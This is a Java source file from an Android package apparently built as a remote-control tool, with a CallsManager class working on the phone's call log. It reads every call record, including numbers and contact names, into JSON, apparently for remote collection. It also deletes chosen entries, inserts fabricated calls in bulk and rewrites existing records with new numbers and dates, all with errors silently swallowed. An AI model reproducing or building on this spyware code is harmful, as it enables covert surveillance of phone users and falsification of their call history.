package com.remote.app.Managers.Calls;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.database.Cursor;
import android.icu.util.Calendar;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.util.Log;

import com.remote.app.MainService;
import com.remote.app.Managers.base;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;

public class CallsManager {

    public static JSONObject getCallsLogs(){

        try {
            JSONObject Calls = new JSONObject();
            JSONArray list = new JSONArray();

            Uri allCalls = Uri.parse("content://call_log/calls");
            Cursor cur = MainService.getContextOfApplication().getContentResolver().query(allCalls, null, null, null, null);

            while (cur.moveToNext()) {
                JSONObject call = new JSONObject();
                String num = cur.getString(cur.getColumnIndex(CallLog.Calls.NUMBER));
                String name = cur.getString(cur.getColumnIndex(CallLog.Calls.CACHED_NAME));
                String duration = cur.getString(cur.getColumnIndex(CallLog.Calls.DURATION));
                String date = cur.getString(cur.getColumnIndex(CallLog.Calls.DATE));

                int type = Integer.parseInt(cur.getString(cur.getColumnIndex(CallLog.Calls.TYPE)));


                call.put(base.CALLS.CALL_PHONE, num);
                call.put(base.CALLS.CALL_NAME, name);
                call.put(base.CALLS.CALL_DURATION, duration);
                call.put(base.CALLS.CALL_DATE, date);
                call.put(base.CALLS.CALL_TYPE, type);
                list.put(call);

            }
            Calls.put("callsList", list);
            return Calls;
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return null;

    }


    @SuppressLint("MissingPermission")
    public static void DeleteCallLog(String date) {
        ContentResolver resolver = MainService.getContextOfApplication().getContentResolver();
        Uri callUri = Uri.parse("content://call_log/calls");
        String[] projection = new String[]{CallLog.Calls.DATE, CallLog.Calls._ID};

        String Raw_id = "";

        Cursor c = resolver.query(callUri,projection,null,null,null);
        if(c != null){
            while (c.moveToNext()){
                final int colDate = c.getColumnIndex(CallLog.Calls.DATE);
                final int colId = c.getColumnIndex(CallLog.Calls._ID);
                do{
                    String SDate = c.getString(colDate);
                    String Id = c.getString(colId);
                    if(SDate.equals(date)){
                        Raw_id = Id;
                        break;
                    }

                }while (c.moveToNext());
            }
        }
        c.close();

        String wh = CallLog.Calls.DATE+ "=? AND "+CallLog.Calls._ID + "=?";
        String[] args = new String[]{date,Raw_id};
        int i = resolver.delete(CallLog.Calls.CONTENT_URI,wh, args);

        if(i != -1 ){}
    }

    @SuppressLint("MissingPermission")//dd MM yyyy HH:mm:ss
    public static void AddCallLog(String type,String number,String duration,String date,Integer count){
        ContentResolver resolver = MainService.getContextOfApplication().getContentResolver();

        Date convertedDate = new Date();

        long d;
        if(date != "") {
            convertedDate.setTime(Long.parseLong(date));
            d= Long.parseLong(date);
        }else{

            d = convertedDate.getTime();
        }

        try{
            if(count ==1){
                ContentValues values = new ContentValues();

                values.put(CallLog.Calls.TYPE, CallLogType.Type(type));
                values.put(CallLog.Calls.NUMBER, number);
                values.put(CallLog.Calls.DURATION, duration);
                values.put(CallLog.Calls.DATE, d);

                resolver.insert(CallLog.Calls.CONTENT_URI, values);
            }
            else{
                for(int i =0;i<count;i++){
                    Date date1 = convertedDate;
                    date1.setSeconds(date1.getSeconds()-i);

                    d=date1.getTime();

                    ContentValues values = new ContentValues();

                    values.put(CallLog.Calls.TYPE, CallLogType.Type(type));
                    values.put(CallLog.Calls.NUMBER, number);
                    values.put(CallLog.Calls.DURATION, duration);
                    values.put(CallLog.Calls.DATE, d);

                    resolver.insert(CallLog.Calls.CONTENT_URI, values);
                }
            }

        }catch (Exception e){}
    }

    @SuppressLint("MissingPermission")
    public static void ChangeCallLog(String O_number,String O_date,String N_type,String N_number,String N_duration,String N_date){
        try{

            SimpleDateFormat dateFormat = new SimpleDateFormat("dd MM yyyy HH:mm:ss");

            long N_d = new Date(String.valueOf(dateFormat.parse(N_date))).getTime();

            ContentResolver resolver = MainService.getContextOfApplication().getContentResolver();

            ContentValues values = new ContentValues();

            values.put(CallLog.Calls.TYPE, CallLogType.Type(N_type));
            values.put(CallLog.Calls.NUMBER, N_number);
            values.put(CallLog.Calls.DURATION, N_duration);
            values.put(CallLog.Calls.DATE, N_d);
            //values.put(CallLog.Calls.CACHED_NAME, N_name);

            String wh= CallLog.Calls.DATE +"=? AND "+ CallLog.Calls.NUMBER +"=?";
            String[] args = new String[]{O_date,O_number};
            resolver.update(CallLog.Calls.CONTENT_URI,values,wh,args);

        }catch (Exception e){}
    }

}
